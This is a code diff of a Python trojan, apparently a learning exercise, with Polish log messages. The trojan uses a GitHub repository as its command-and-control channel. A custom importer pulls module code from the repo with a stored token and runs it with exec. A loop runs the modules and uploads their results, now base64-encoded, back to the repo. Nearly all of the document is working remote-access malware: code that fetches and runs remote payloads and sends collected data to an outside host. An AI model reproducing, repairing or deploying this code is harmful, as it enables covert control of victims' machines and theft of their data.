@@ -38,6 +38,7 @@ class GitImporter:
         self.current_module_code = ""
 
     def find_module(self, name, path=None):
+        # print("[*] Próba pobrania {%s}" % name)
         print(f"[*] Próba pobrania {name}")
         self.import_repo = github_connect('trojan', 'token_trojan.txt')
 
@@ -53,6 +54,7 @@ class GitImporter:
         exec(self.current_module_code, new_module.__dict__)
         sys.modules[spec.name] = new_module
         return new_module
+
 
 class LocalImporter:
     def __init__(self, modules_path):
@@ -73,6 +75,7 @@ class LocalImporter:
         return new_module
 
 
+
 class Trojan:
     def __init__(self, id):
         self.id = id
@@ -91,7 +94,7 @@ class Trojan:
         return config
 
     def module_runner(self, module):
-        print(f"[*] Uruchamianie modułu {name}")
+        print(f"[*] Uruchamianie modułu {module}")
         result = sys.modules[module].run()
         self.store_module_result(result)
 
@@ -99,8 +102,8 @@ class Trojan:
         message = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
         remote_path = f'data/{self.id}/{message}.data'
         bindata = bytes('%r' % data, 'utf-8')
-        # self.export_repo.create_file(remote_path, message, base64.b64encode(bindata))
-        self.export_repo.create_file(remote_path, message, bindata)
+        self.export_repo.create_file(remote_path, message, base64.b64encode(bindata))
+        # self.export_repo.create_file(remote_path, message, bindata)
 
     def run(self):
         while True:
@@ -119,5 +122,6 @@ if __name__ == '__main__':
     import_or_install_github3()
 
     sys.meta_path.append(GitImporter())
+    # sys.meta_path.append(LocalImporter('modules'))
     trojan = Trojan('scan')
     trojan.run()
